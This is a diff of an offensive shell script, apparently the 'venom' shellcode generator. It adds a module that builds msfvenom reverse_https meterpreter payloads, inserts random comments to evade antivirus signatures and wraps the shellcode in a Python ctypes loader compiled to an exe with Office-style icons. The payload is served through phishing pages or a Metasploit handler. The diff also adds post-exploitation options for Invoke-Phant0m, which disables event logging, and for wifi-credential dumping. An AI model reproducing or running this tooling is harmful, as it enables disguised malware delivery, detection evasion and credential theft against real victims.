+      echo "[☠] Reloading msfdb database .."
+      sleep 2
+      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfdb reinit" > /dev/null 2>&1
+      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfconsole -q -x 'db_status; reload_all; exit -y'" > /dev/null 2>&1
+    fi
+
+      #
+      # check if Invoke-Phantom.ps1 exists ..
+      #
+      if [ -e "$IPATH/aux/Invoke-Phant0m.ps1" ]; then
+        echo "[☠] Invoke-Phant0m.ps1 found .."
+        sleep 2
+        cp $IPATH/aux/Invoke-Phant0m.ps1 /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
+      else
+        echo "[x] Invoke-Phant0m.ps1 not found .."
+        sleep 2
+        echo "[☠] Please place module in $IPATH/aux folder .."
+        sleep 2
+        exit
+      fi
+  fi
+
+
+
+if [ "$P0" = "post_linux.rc" ]; then
+# store metasploit post exploit directory structure
+CHeK_PoSt=`cat $IPATH/settings | egrep -m 1 "POST_EXPLOIT_DIR" | cut -d '=' -f2` > /dev/null 2>&1
+  if [ -e "$CHeK_PoSt/linux/gather/wifi_dump_linux.rb" ]; then
+    echo "[✔] wifi_dump_linux.rb -> found"
+    sleep 2
+  else
+    echo "[x] wifi_dump_linux.rb -> not found"
+    sleep 1
+    echo "    copy post-module to msfdb .."
+    cp $IPATH/aux/wifi_dump_linux.rb $CHeK_PoSt/linux/gather/wifi_dump_linux.rb > /dev/null 2>&1
+    echo "[☠] Reloading msfdb database .."
+    sleep 2
+    xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfdb reinit" > /dev/null 2>&1
+    xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfconsole -q -x 'db_status; reload_all; exit -y'" > /dev/null 2>&1
+  fi
+fi
+
 
       # edit files nedded
       cd $IPATH/templates/phishing
@@ -4868,6 +5605,7 @@ P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploita
             sed -i "s/\[K//g" final.log
             sed -i "s/\[1m\[31m//g" final.log
             sed -i "s/\[1m\[32m//g" final.log
+            sed -i "s/\[1m\[33m//g" final.log
             mv final.log $N4m-$lhost.log > /dev/null 2>&1
             rm report.log > /dev/null 2>&1
             cd $IPATH/
@@ -4897,6 +5635,7 @@ P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploita
             sed -i "s/\[K//g" final.log
             sed -i "s/\[1m\[31m//g" final.log
             sed -i "s/\[1m\[32m//g" final.log
+            sed -i "s/\[1m\[33m//g" final.log
             mv final.log $N4m-$lhost.log > /dev/null 2>&1
             rm report.log > /dev/null 2>&1
             cd $IPATH/
@@ -4913,6 +5652,7 @@ mv $IPATH/templates/phishing/driveBy[bak].html $InJEc13 > /dev/null 2>&1
 rm $IPATH/templates/phishing/copy.html > /dev/null 2>&1
 rm $ApAcHe/$N4m.jar > /dev/null 2>&1
 rm $ApAcHe/index.html > /dev/null 2>&1
+rm /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
 clear
 cd $IPATH/
 
@@ -4979,6 +5719,7 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
          sed -i "s/\[K//g" final.log
          sed -i "s/\[1m\[31m//g" final.log
          sed -i "s/\[1m\[32m//g" final.log
+         sed -i "s/\[1m\[33m//g" final.log
          mv final.log $N4m-$lhost.log > /dev/null 2>&1
          rm report.log > /dev/null 2>&1
          cd $IPATH/
@@ -5024,6 +5765,7 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
             sed -i "s/\[K//g" final.log
             sed -i "s/\[1m\[31m//g" final.log
             sed -i "s/\[1m\[32m//g" final.log
+            sed -i "s/\[1m\[33m//g" final.log
             mv final.log $N4m-$lhost.log > /dev/null 2>&1
             rm report.log > /dev/null 2>&1
             cd $IPATH/
@@ -5052,6 +5794,7 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
             sed -i "s/\[K//g" final.log
             sed -i "s/\[1m\[31m//g" final.log
             sed -i "s/\[1m\[32m//g" final.log
+            sed -i "s/\[1m\[33m//g" final.log
             mv final.log $N4m-$lhost.log > /dev/null 2>&1
             rm report.log > /dev/null 2>&1
             cd $IPATH/
@@ -5153,7 +5896,62 @@ chmod +x $IPATH/output/$filename.py
 
 
 # post-exploitation
-P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "fast_migrate.rc" FALSE "cred_dump.rc" FALSE "gather.rc" FALSE "post_multi.rc" FALSE "exploit_suggester.rc" --width 305 --height 300) > /dev/null 2>&1
+P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "fast_migrate.rc" FALSE "cred_dump.rc" FALSE "gather.rc" FALSE "post_linux.rc" FALSE "post_multi.rc" FALSE "exploit_suggester.rc" FALSE "Invoke-Phantom.rc" --width 305 --height 360) > /dev/null 2>&1
+
+
+  if [ "$P0" = "Invoke-Phantom.rc" ]; then
+    #
+    # check if dependencies exist ..
+    #
+    if [ -e "$pHanTom/windows/manage/Invoke-Phant0m.rb" ]; then
+      echo "[☠] Invoke-Phant0m.rb installed .."
+      sleep 2
+    else
+      echo "[x] Invoke-Phant0m.rb not found .."
+      sleep 2
+      echo "[☠] copy Invoke-Phant0m.rb to msfdb .."
+      sleep 2
+      cp $IPATH/aux/Invoke-Phant0m.rb $pHanTom/windows/manage/Invoke-Phant0m.rb > /dev/null 2>&1
+      echo "[☠] Reloading msfdb database .."
+      sleep 2
+      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfdb reinit" > /dev/null 2>&1
+      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfconsole -q -x 'db_status; reload_all; exit -y'" > /dev/null 2>&1
+    fi
+
+      #
+      # check if Invoke-Phantom.ps1 exists ..
+      #
+      if [ -e "$IPATH/aux/Invoke-Phant0m.ps1" ]; then
+        echo "[☠] Invoke-Phant0m.ps1 found .."
+        sleep 2
+        cp $IPATH/aux/Invoke-Phant0m.ps1 /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
+      else
+        echo "[x] Invoke-Phant0m.ps1 not found .."
+        sleep 2
+        echo "[☠] Please place module in $IPATH/aux folder .."
+        sleep 2
+        exit
+      fi
+  fi
+
+
+if [ "$P0" = "post_linux.rc" ]; then
+# store metasploit post exploit directory structure
+CHeK_PoSt=`cat $IPATH/settings | egrep -m 1 "POST_EXPLOIT_DIR" | cut -d '=' -f2` > /dev/null 2>&1
+  if [ -e "$CHeK_PoSt/linux/gather/wifi_dump_linux.rb" ]; then
+    echo "[✔] wifi_dump_linux.rb -> found"
+    sleep 2
+  else
+    echo "[x] wifi_dump_linux.rb -> not found"
+    sleep 1
+    echo "    copy post-module to msfdb .."
+    cp $IPATH/aux/wifi_dump_linux.rb $CHeK_PoSt/linux/gather/wifi_dump_linux.rb > /dev/null 2>&1
+    echo "[☠] Reloading msfdb database .."
+    sleep 2
+    xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfdb reinit" > /dev/null 2>&1
+    xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfconsole -q -x 'db_status; reload_all; exit -y'" > /dev/null 2>&1
+  fi
+fi
 
 
 cd $IPATH/templates/phishing
@@ -5189,6 +5987,7 @@ echo "- SEND THE URL GENERATED TO TARGET HOST"
             sed -i "s/\[K//g" final.log
             sed -i "s/\[1m\[31m//g" final.log
             sed -i "s/\[1m\[32m//g" final.log
+            sed -i "s/\[1m\[33m//g" final.log
             mv final.log $filename-$srvhost.log > /dev/null 2>&1
             rm report.log > /dev/null 2>&1
             cd $IPATH/
@@ -5219,6 +6018,7 @@ echo "- SEND THE URL GENERATED TO TARGET HOST"
             sed -i "s/\[K//g" final.log
             sed -i "s/\[1m\[31m//g" final.log
             sed -i "s/\[1m\[32m//g" final.log
+            sed -i "s/\[1m\[33m//g" final.log
             mv final.log $filename-$srvhost.log > /dev/null 2>&1
             rm report.log > /dev/null 2>&1
             cd $IPATH/
@@ -5235,6 +6035,7 @@ mv $IPATH/templates/web_delivery[bak].py $IPATH/templates/web_delivery.py > /dev
 rm $IPATH/templates/phishing/copy.html > /dev/null 2>&1
 rm $ApAcHe/$filename.py > /dev/null 2>&1
 rm $ApAcHe/index.html > /dev/null 2>&1
+rm /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
 sleep 2
 clear
 cd $IPATH/
@@ -5291,7 +6092,43 @@ chmod +x $IPATH/output/$filename.bat
 
 
 # post-exploitation
-P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "fast_migrate.rc" FALSE "cred_dump.rc" FALSE "gather.rc" FALSE "post_multi.rc" FALSE "exploit_suggester.rc" --width 305 --height 300) > /dev/null 2>&1
+P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "fast_migrate.rc" FALSE "cred_dump.rc" FALSE "gather.rc" FALSE "post_multi.rc" FALSE "exploit_suggester.rc" FALSE "Invoke-Phantom.rc" --width 305 --height 330) > /dev/null 2>&1
+
+
+  if [ "$P0" = "Invoke-Phantom.rc" ]; then
+    #
+    # check if dependencies exist ..
+    #
+    if [ -e "$pHanTom/windows/manage/Invoke-Phant0m.rb" ]; then
+      echo "[☠] Invoke-Phant0m.rb installed .."
+      sleep 2
+    else
+      echo "[x] Invoke-Phant0m.rb not found .."
+      sleep 2
+      echo "[☠] copy Invoke-Phant0m.rb to msfdb .."
+      sleep 2
+      cp $IPATH/aux/Invoke-Phant0m.rb $pHanTom/windows/manage/Invoke-Phant0m.rb > /dev/null 2>&1
+      echo "[☠] Reloading msfdb database .."
+      sleep 2
+      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfdb reinit" > /dev/null 2>&1
+      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfconsole -q -x 'db_status; reload_all; exit -y'" > /dev/null 2>&1
+    fi
+
+      #
+      # check if Invoke-Phantom.ps1 exists ..
+      #
+      if [ -e "$IPATH/aux/Invoke-Phant0m.ps1" ]; then
+        echo "[☠] Invoke-Phant0m.ps1 found .."
+        sleep 2
+        cp $IPATH/aux/Invoke-Phant0m.ps1 /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
+      else
+        echo "[x] Invoke-Phant0m.ps1 not found .."
+        sleep 2
+        echo "[☠] Please place module in $IPATH/aux folder .."
+        sleep 2
+        exit
+      fi
+  fi
 
 
 cd $IPATH/templates/phishing
@@ -5327,6 +6164,7 @@ echo "- SEND THE URL GENERATED TO TARGET HOST"
             sed -i "s/\[K//g" final.log
             sed -i "s/\[1m\[31m//g" final.log
             sed -i "s/\[1m\[32m//g" final.log
+            sed -i "s/\[1m\[33m//g" final.log
             mv final.log $filename-$srvhost.log > /dev/null 2>&1
             rm report.log > /dev/null 2>&1
             cd $IPATH/
@@ -5356,6 +6194,7 @@ echo "- SEND THE URL GENERATED TO TARGET HOST"
             sed -i "s/\[K//g" final.log
             sed -i "s/\[1m\[31m//g" final.log
             sed -i "s/\[1m\[32m//g" final.log
+            sed -i "s/\[1m\[33m//g" final.log
             mv final.log $filename-$srvhost.log > /dev/null 2>&1
             rm report.log > /dev/null 2>&1
             cd $IPATH/
@@ -5372,6 +6211,7 @@ mv $IPATH/templates/web_delivery[bak].bat $IPATH/templates/web_delivery.bat > /d
 rm $IPATH/templates/phishing/copy.html > /dev/null 2>&1
 rm $ApAcHe/$filename.bat > /dev/null 2>&1
 rm $ApAcHe/index.html > /dev/null 2>&1
+rm /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
 sleep 2
 clear
 cd $IPATH/
@@ -5453,7 +6293,7 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
       echo "[☠] Start a multi-handler..."
       echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
       echo "[☯] Please dont test samples on virus total..."
-xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -r $IPATH/output/handler.rc"
+      xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -r $IPATH/output/handler.rc"
       sleep 2
 
    else
@@ -5570,6 +6410,7 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
           sed -i "s/\[K//g" final.log
           sed -i "s/\[1m\[31m//g" final.log
           sed -i "s/\[1m\[32m//g" final.log
+          sed -i "s/\[1m\[33m//g" final.log
           mv final.log $N4m-$lhost.log > /dev/null 2>&1
           rm report.log > /dev/null 2>&1
           cd $IPATH/
@@ -5613,6 +6454,7 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
+           sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
@@ -5641,6 +6483,7 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
             sed -i "s/\[K//g" final.log
             sed -i "s/\[1m\[31m//g" final.log
             sed -i "s/\[1m\[32m//g" final.log
+            sed -i "s/\[1m\[33m//g" final.log
             mv final.log $N4m-$lhost.log > /dev/null 2>&1
             rm report.log > /dev/null 2>&1
             cd $IPATH/
@@ -5715,7 +6558,7 @@ cat << !
 !
 
 # use metasploit to build shellcode (msf encoded)
-xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport -a x86 --platform windows -e x86/countdown -i 8 -f raw | msfvenom -a x86 --platform windows -e x86/call4_dword_xor -i 7 -f raw | msfvenom -a x86 --platform windows -e x86/shikata_ga_nai -i 9 -f exe-service > $IPATH/output/$N4m.exe"
+xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport --platform windows -e x86/countdown -i 8 -f raw | msfvenom --platform windows -e x86/call4_dword_xor -i 7 -f raw | msfvenom --platform windows -e x86/shikata_ga_nai -i 9 -f exe-service > $IPATH/output/$N4m.exe"
 
 
 
@@ -5739,6 +6582,7 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
           sed -i "s/\[K//g" final.log
           sed -i "s/\[1m\[31m//g" final.log
           sed -i "s/\[1m\[32m//g" final.log
+          sed -i "s/\[1m\[33m//g" final.log
           mv final.log $N4m-$lhost.log > /dev/null 2>&1
           rm report.log > /dev/null 2>&1
           cd $IPATH/
@@ -5751,7 +6595,43 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
    else
 
 
-P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "fast_migrate.rc" FALSE "cred_dump.rc" FALSE "gather.rc" FALSE "post_multi.rc" FALSE "exploit_suggester.rc" --width 305 --height 290) > /dev/null 2>&1
+P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "fast_migrate.rc" FALSE "cred_dump.rc" FALSE "gather.rc" FALSE "post_multi.rc" FALSE "exploit_suggester.rc" FALSE "Invoke-Phantom.rc" --width 305 --height 320) > /dev/null 2>&1
+
+
+  if [ "$P0" = "Invoke-Phantom.rc" ]; then
+    #
+    # check if dependencies exist ..
+    #
+    if [ -e "$pHanTom/windows/manage/Invoke-Phant0m.rb" ]; then
+      echo "[☠] Invoke-Phant0m.rb installed .."
+      sleep 2
+    else
+      echo "[x] Invoke-Phant0m.rb not found .."
+      sleep 2
+      echo "[☠] copy Invoke-Phant0m.rb to msfdb .."
+      sleep 2
+      cp $IPATH/aux/Invoke-Phant0m.rb $pHanTom/windows/manage/Invoke-Phant0m.rb > /dev/null 2>&1
+      echo "[☠] Reloading msfdb database .."
+      sleep 2
+      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfdb reinit" > /dev/null 2>&1
+      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfconsole -q -x 'db_status; reload_all; exit -y'" > /dev/null 2>&1
+    fi
+
+      #
+      # check if Invoke-Phantom.ps1 exists ..
+      #
+      if [ -e "$IPATH/aux/Invoke-Phant0m.ps1" ]; then
+        echo "[☠] Invoke-Phant0m.ps1 found .."
+        sleep 2
+        cp $IPATH/aux/Invoke-Phant0m.ps1 /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
+      else
+        echo "[x] Invoke-Phant0m.ps1 not found .."
+        sleep 2
+        echo "[☠] Please place module in $IPATH/aux folder .."
+        sleep 2
+        exit
+      fi
+  fi
 
 
     # Build listenner resource file
@@ -5797,6 +6677,7 @@ P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploita
           sed -i "s/\[K//g" final.log
           sed -i "s/\[1m\[31m//g" final.log
           sed -i "s/\[1m\[32m//g" final.log
+          sed -i "s/\[1m\[33m//g" final.log
           mv final.log $N4m-$lhost.log > /dev/null 2>&1
           rm report.log > /dev/null 2>&1
           cd $IPATH/
@@ -5826,6 +6707,7 @@ P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploita
             sed -i "s/\[K//g" final.log
             sed -i "s/\[1m\[31m//g" final.log
             sed -i "s/\[1m\[32m//g" final.log
+            sed -i "s/\[1m\[33m//g" final.log
             mv final.log $N4m-$lhost.log > /dev/null 2>&1
             rm report.log > /dev/null 2>&1
             cd $IPATH/
@@ -5839,7 +6721,7 @@ P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploita
 else
 
 
-  echo "[x] Abort ...."
+  echo "[x] Abort execution .."
   sleep 2
 fi
 
@@ -5850,6 +6732,656 @@ mv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1
 rm $IPATH/templates/phishing/copy.html > /dev/null 2>&1
 rm $ApAcHe/$N4m.exe > /dev/null 2>&1
 rm $ApAcHe/index.html > /dev/null 2>&1
+rm /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
+sleep 2
+clear
+cd $IPATH/
+}
+
+
+
+
+# -----------------------------------------------------
+# C - PYTHON to EXE shellcode (SSL/TLS eavesdrop)
+# ------------------------------------------------------
+sh_shellcode23 () {
+# module description
+cat << !
+
+    ╔─────────────────────────────────────────────────────────────╗
+    | This module uses reverse_https payloads and gmail pem cert  |
+    | to prevent session data beeing eavesdrop by 3º party actors |
+    |  It also uses random UUID keys to evade signature detection |
+    |                                                             |
+    |  Detection ratio:                                           |
+    |  https://nodistribute.com/result/LDynoZOq9A5TeBMYFW4k       |
+    ╚─────────────────────────────────────────────────────────────╝
+
+!
+sleep 2
+# run module or abort ? 
+QuE=$(zenity --question --title="☠ UUID random keys evasion ☠" --text "Author: r00t-3xp10it/null-byte\nRun uuid module?" --width 240) > /dev/null 2>&1
+if [ "$?" -eq "0" ]; then
+# get user input to build shellcode
+echo "[☠] Enter shellcode settings!"
+lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
+lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
+# input payload choise
+paylo=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "windows/meterpreter/reverse_winhttps" FALSE "windows/meterpreter/reverse_https" FALSE "windows/meterpreter/reverse_http" FALSE "windows/x64/meterpreter/reverse_https" --width 350 --height 260) > /dev/null 2>&1
+
+echo "[☠] Building shellcode -> C,SSL/TLS format .."
+sleep 2
+# display final settings to user
+cat << !
+
+ shellcode settings
++------------------
+| LPORT   : $lport
+| LHOST   : $lhost
+| FORMAT  : C,SSL/TLS -> WINDOWS(EXE)
+|_PAYLOAD : $paylo
+
+!
+
+# use metasploit to build shellcode (msf encoded)
+# https://nodistribute.com/result/0DGFYgWdtaKuv8NzMiqAwJIQfmBy (2/39) py raw
+# https://nodistribute.com/result/BunD148C79GOQkxj0g2deHqI (3/39) py exe
+# https://nodistribute.com/result/LDynoZOq9A5TeBMYFW4k (2/39) nullbite obfuscation
+xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport PayloadUUIDTracking=true HandlerSSLCert=$IPATH/obfuscate/www.gmail.com.pem StagerVerifySSLCert=true PayloadUUIDName=ParanoidStagedPSH --smallest -f c | tr -d '\"' | tr -d '\n' | more > $IPATH/output/chars.raw"
+
+
+echo ""
+# strip bad caracters and store shellcode 
+store=`cat $IPATH/output/chars.raw | awk {'print $5'} | cut -d ';' -f1`
+# display generated code
+cat $IPATH/output/chars.raw
+echo "" && echo "" && echo ""
+sleep 2
+
+
+   # check if chars.raw as generated
+   if [ -e "$IPATH/output/chars.raw" ]; then
+      echo "[☠] chars.raw -> found!"
+      sleep 2
+ 
+   else
+
+      echo "[☠] chars.raw -> not found!"
+      exit
+      fi
+
+
+# EDITING/BACKUP FILES NEEDED
+N4m=$(zenity --entry --title "☠ PAYLOAD NAME ☠" --text "Enter payload output name\nexample: shellcode" --width 300) > /dev/null 2>&1
+echo "[☠] editing/backup files..."
+
+#
+# Template ramdom keys ..
+# HINT: adding ramdom comments to source code
+# will help evading AVs signature detection (nullbite) 
+# "a computer can never outsmart a always changing virus" 
+#
+NEW_UUID_1=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w $UUID_RANDOM_LENGTH | head -n 1)
+NEW_UUID_2=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w $UUID_RANDOM_LENGTH | head -n 1)
+NEW_UUID_3=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w $UUID_RANDOM_LENGTH | head -n 1)
+#
+# pyinstalle does not accept numbers in funtion names (compiling), so we use only leters ..
+#
+NEW_UUID_4=$(cat /dev/urandom | tr -dc 'a-zA-Z' | fold -w 10 | head -n 1)
+NEW_UUID_5=$(cat /dev/urandom | tr -dc 'a-zA-Z' | fold -w 11 | head -n 1)
+NEW_UUID_6=$(cat /dev/urandom | tr -dc 'a-zA-Z' | fold -w 12 | head -n 1)
+
+
+#
+# Build python Template (random UUID keys)
+#
+cd $IPATH/output
+echo "[☠] build -> template.py"
+sleep 1
+echo "[✔] Using random UUID keys (evade signature detection)"
+sleep 1
+echo "#!/usr/bin/python" > template.py
+echo "# -*- coding: utf-8 -*-" >> template.py
+echo "import win32api, win32con" >> template.py
+echo "# $NEW_UUID_1" >> template.py
+echo "import win32event, winerror" >> template.py
+echo "# $NEW_UUID_2" >> template.py
+echo "from ctypes import *" >> template.py
+echo "# $NEW_UUID_3" >> template.py
+echo "$NEW_UUID_4 = (\"$store\");" >> template.py
+echo "# gdGtdfASsTmFFsGbaaUnaDtaAvAaTkDKsHFdtGaAGmDoTkEkoT" >> template.py
+echo "$NEW_UUID_5 = create_string_buffer($NEW_UUID_4, len($NEW_UUID_4))" >> template.py
+echo "# GSMsdMfhmDjkGjDhMhhMfdsAsasAffWgUkhWWjWjGfdOgEEjue" >> template.py
+echo "$NEW_UUID_6 = cast($NEW_UUID_5, CFUNCTYPE(c_void_p))" >> template.py
+echo "# HdFDgFDttPkSMcSsFSKaWdBfDBmkSkOSiBewSDoFtLmDeWsKvG" >> template.py
+echo "$NEW_UUID_6()" >> template.py
+sleep 2
+
+     # check if pyinstaller its installed
+     if [ -d $DrIvC/$PiWiN ]; then
+       # compile python to exe
+       echo "[☠] pyinstaller -> found!"
+       sleep 2
+       echo "[☠] compile template.py -> $N4m.exe"
+       sleep 2
+       cd $IPATH/output
+
+# chose executable final icon (.ico)
+iCn=$(zenity --list --title "☠ REPLACE AGENT ICON ☠" --text "\nChose icon to use:" --radiolist --column "Pick" --column "Option" TRUE "Windows-Store.ico" FALSE "Windows-Logo.ico" FALSE "Microsoft-Word.ico" FALSE "Microsoft-Excel.ico" --width 320 --height 240) > /dev/null 2>&1
+
+       #
+       # TODO: check if executes on windows systems
+       # http://zitstif.no-ip.org/?p=882
+       #
+       # install pycrypto
+       # wine msiexec /i pycrypto-2.3.win32-py2.6.msi
+       # try to crypt pyinstaller with --key MySuperSecretPassword
+       # http://sparkandshine.net/build-a-windows-executable-from-python-scripts-on-linux/
+       # http://tzutalin.blogspot.pt/2016/12/make-python-program-executable-and.html
+       # https://github.com/d3m3vilurr/Veil/blob/master/modules/common/supportfiles.py
+       #
+       xterm -T " PYINSTALLER " -geometry 110x23 -e "su $user -c '$arch c:/$PyIn/Python.exe c:/$PiWiN/pyinstaller.py --noconsole -i $IPATH/bin/icons/$iCn --onefile $IPATH/output/template.py'"
+       cp $IPATH/output/dist/template.exe $IPATH/output/$N4m.exe
+       rm $IPATH/output/*.spec > /dev/null 2>&1
+       rm $IPATH/output/*.log > /dev/null 2>&1
+       rm -r $IPATH/output/dist > /dev/null 2>&1
+       rm -r $IPATH/output/build > /dev/null 2>&1
+     else
+      echo "[☠] pyinstaller not found .."
+      exit
+     fi
+
+
+# CHOSE HOW TO DELIVER YOUR PAYLOAD
+serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload stored:\n$IPATH/output/$N4m.exe\n\nchose how to deliver: $N4m.exe" --radiolist --column "Pick" --column "Option" TRUE "multi-handler (default)" FALSE "apache2 (malicious url)" --width 305 --height 220) > /dev/null 2>&1
+
+
+   if [ "$serv" = "multi-handler (default)" ]; then
+      # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
+      echo "[☠] Start a multi-handler..."
+      echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
+      echo "[☯] Please dont test samples on virus total..."
+        if [ "$MsFlF" = "ON" ]; then
+          xterm -T "PAYLOAD MULTI-HANDLER" -geometry 124x26 -e "msfconsole -q -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set PAYLOAD $paylo; set LHOST $lhost; set LPORT $lport; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set EnableStageEncoding true; set StageEncoder x86/shikata_ga_nai; exploit'"
+          cd $IPATH/output
+          # delete utf-8/non-ancii caracters from output
+          tr -cd '\11\12\15\40-\176' < report.log > final.log
+          sed -i "s/\[0m//g" final.log
+          sed -i "s/\[1m\[34m//g" final.log
+          sed -i "s/\[4m//g" final.log
+          sed -i "s/\[K//g" final.log
+          sed -i "s/\[1m\[31m//g" final.log
+          sed -i "s/\[1m\[32m//g" final.log
+          sed -i "s/\[1m\[33m//g" final.log
+          mv final.log $N4m-$lhost.log > /dev/null 2>&1
+          rm report.log > /dev/null 2>&1
+          cd $IPATH/
+        else
+          xterm -T "PAYLOAD MULTI-HANDLER" -geometry 124x26 -e "msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD $paylo; set LHOST $lhost; set LPORT $lport; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set EnableStageEncoding true; set StageEncoder x86/shikata_ga_nai; exploit'"
+        fi
+      sleep 2
+
+
+   else
+
+
+P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "fast_migrate.rc" FALSE "cred_dump.rc" FALSE "gather.rc" FALSE "post_multi.rc" FALSE "exploit_suggester.rc" FALSE "Invoke-Phantom.rc" --width 305 --height 320) > /dev/null 2>&1
+
+
+  if [ "$P0" = "Invoke-Phantom.rc" ]; then
+    #
+    # check if dependencies exist ..
+    #
+    if [ -e "$pHanTom/windows/manage/Invoke-Phant0m.rb" ]; then
+      echo "[☠] Invoke-Phant0m.rb installed .."
+      sleep 2
+    else
+      echo "[x] Invoke-Phant0m.rb not found .."
+      sleep 2
+      echo "[☠] copy Invoke-Phant0m.rb to msfdb .."
+      sleep 2
+      cp $IPATH/aux/Invoke-Phant0m.rb $pHanTom/windows/manage/Invoke-Phant0m.rb > /dev/null 2>&1
+      echo "[☠] Reloading msfdb database .."
+      sleep 2
+      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfdb reinit" > /dev/null 2>&1
+      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfconsole -q -x 'db_status; reload_all; exit -y'" > /dev/null 2>&1
+    fi
+
+      #
+      # check if Invoke-Phantom.ps1 exists ..
+      #
+      if [ -e "$IPATH/aux/Invoke-Phant0m.ps1" ]; then
+        echo "[☠] Invoke-Phant0m.ps1 found .."
+        sleep 2
+        cp $IPATH/aux/Invoke-Phant0m.ps1 /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
+      else
+        echo "[x] Invoke-Phant0m.ps1 not found .."
+        sleep 2
+        echo "[☠] Please place module in $IPATH/aux folder .."
+        sleep 2
+        exit
+      fi
+  fi
+
+
+      # edit files nedded
+      cd $IPATH/templates/phishing
+      cp $InJEc12 mega[bak].html
+      sed "s|NaM3|$N4m.exe|g" mega.html > copy.html
+      cp copy.html $ApAcHe/index.html > /dev/null 2>&1
+      cd $IPATH/output
+      cp $N4m.exe $ApAcHe/$N4m.exe > /dev/null 2>&1
+      echo "[☠] loading -> Apache2Server!"
